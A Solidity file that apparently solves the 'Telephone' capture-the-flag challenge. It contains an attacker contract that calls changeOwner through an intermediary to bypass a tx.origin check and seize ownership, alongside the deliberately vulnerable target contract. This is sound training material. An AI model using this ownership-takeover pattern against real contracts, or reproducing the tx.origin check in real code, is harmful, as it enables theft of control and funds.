// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import 'Interface.sol';

contract hack{
    address _addr = 0x33080Bd8AE242BeC068b582A02A148551dBA9151;
    
    function setAddr(address __addr) external{
        _addr = __addr;
    }

    function callOwner() public{

        // (bool success, bytes memory data) = _addr.call{gas: 500000}(
        //     abi.encodeWithSignature("changeOwner(address)", msg.sender)
        // );
        Telephone t = Telephone(_addr);
        t.changeOwner(msg.sender);

    }
    function callOrigin() public{

        (bool success, bytes memory data) = _addr.call{gas: 500000}(
            abi.encodeWithSignature("getorigin()")
        );

    }

}

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
